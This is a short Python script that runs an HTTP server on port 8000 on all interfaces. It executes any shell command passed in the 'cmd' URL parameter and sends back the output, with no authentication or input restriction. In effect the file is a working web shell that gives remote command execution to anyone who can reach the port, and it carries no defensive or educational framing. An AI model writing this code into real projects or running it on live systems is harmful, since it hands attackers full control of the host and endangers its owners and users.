import http.server
import socketserver
import urllib.parse
import subprocess

class CommandHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        # Parse the URL and query parameters
        parsed_url = urllib.parse.urlparse(self.path)
        query_params = urllib.parse.parse_qs(parsed_url.query)

        # Check if 'cmd' parameter exists
        if 'cmd' in query_params:
            cmd = query_params['cmd'][0]  # Get the first value

            try:
                # Execute the command in shell
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)

                # Prepare response
                output = result.stdout
                if result.stderr:
                    output += "\nSTDERR:\n" + result.stderr

                # Send response
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(output.encode('utf-8'))

            except subprocess.TimeoutExpired:
                self.send_response(408)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(b'Command timed out after 30 seconds')

            except Exception as e:
                self.send_response(500)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(f'Error executing command: {str(e)}'.encode('utf-8'))
        else:
            # No 'cmd' parameter provided
            self.send_response(400)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'Missing "cmd" query parameter. Usage: /?cmd=your_command')

    def log_message(self, format, *args):
        # Print request info to console
        print(f"[{self.address_string()}] {format % args}")

def run_server():
    PORT = 8000

    with socketserver.TCPServer(("", PORT), CommandHandler) as httpd:
        print(f"Server running on http://localhost:{PORT}")
        print(f"Usage: http://localhost:{PORT}/?cmd=your_command")
        print("Press Ctrl+C to stop the server")

        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\nStopping server...")
            print("Server stopped.")
            httpd.shutdown()

if __name__ == "__main__":
    run_server()
